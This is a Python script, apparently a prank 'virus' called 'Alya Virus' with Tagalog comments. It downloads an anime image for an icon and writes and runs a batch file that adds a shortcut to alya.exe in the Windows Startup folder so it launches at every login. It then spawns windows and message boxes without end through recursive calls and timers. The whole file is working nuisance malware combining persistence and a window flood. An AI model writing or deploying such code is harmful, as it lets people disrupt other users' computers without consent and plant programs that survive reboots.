import tkinter as tk
from PIL import Image, ImageTk
import requests
from io import BytesIO
from tkinter import messagebox
import subprocess


# CREATE TAYO NG ICON
def create_ico_from_url(image_url, ico_image_path):
    response = requests.get(image_url)
    response.raise_for_status()

    img = Image.open(BytesIO(response.content))

    img.save(ico_image_path, format='ICO')

    print(f'ICO file created successfully at {ico_image_path}.')

image_url = 'https://a.storyblok.com/f/178900/960x540/1e492935d2/roshidere-teasaer-pv.jpg/m/filters:quality(95)format(webp)'
ico_image_path = 'alya.ico'
create_ico_from_url(image_url, ico_image_path)

#CREATE TAYO NG BATCH FILES
def create_batch_files():
    create_bat_content = '''@echo off
set "startup_folder=C:\\Users\\Yuri\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
set "exe_name=alya.exe"
set "shortcut_name=app.lnk"
set "search_dir=%CD%"  :: You can set this to a specific directory if needed

if exist "%search_dir%\\%exe_name%" (
    echo %exe_name% found in %search_dir%.
    if not exist "%startup_folder%\\%shortcut_name%" (
        echo Creating shortcut in Startup folder...
        powershell -Command "$s = (New-Object -ComObject WScript.Shell).CreateShortcut('%startup_folder%\\%shortcut_name%'); $s.TargetPath = '%search_dir%\\%exe_name%'; $s.Save()"
    ) else (
        echo Shortcut already exists in Startup folder.
    )
) else (
    echo %exe_name% not found in %search_dir%.
)

exit
'''

    delete_bat_content = '''@echo off
set "startup_folder=C:\\Users\\Yuri\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
set "shortcut_name=app.lnk"

if exist "%startup_folder%\\%shortcut_name%" (
    echo Deleting shortcut from Startup folder...
    del "%startup_folder%\\%shortcut_name%"
) else (
    echo Shortcut does not exist in Startup folder.
)

exit
'''

    with open('setup.bat', 'w') as file:
        file.write(create_bat_content)

    with open('remove.bat', 'w') as file:
        file.write(delete_bat_content)

    print('Batch files created successfully.')

create_batch_files()


#START NG VIRUS
bat_file_path = r'setup.bat'

subprocess.run([bat_file_path], shell=True)

def show_image():
    window = tk.Toplevel()
    window.title("Alya")
    window.resizable(False, False)

    window.iconbitmap('alya.ico') 
    #LINK NG IMAGE FROM INTERNET
    url = "https://a.storyblok.com/f/178900/960x540/1e492935d2/roshidere-teasaer-pv.jpg/m/filters:quality(95)format(webp)"
    response = requests.get(url)
    img_data = BytesIO(response.content)

    img = Image.open(img_data)
    img = img.resize((300, 300))
    img = ImageTk.PhotoImage(img)

    label = tk.Label(window, image=img)
    label.image = img  
    label.pack()

    window.after(2000, show_image)
    messagebox.showinfo("Alya Virus", "Я тебя люблю")
    show_image()

root = tk.Tk()  
root.withdraw()
root.iconbitmap('alya.ico')  

show_image()
root.mainloop()
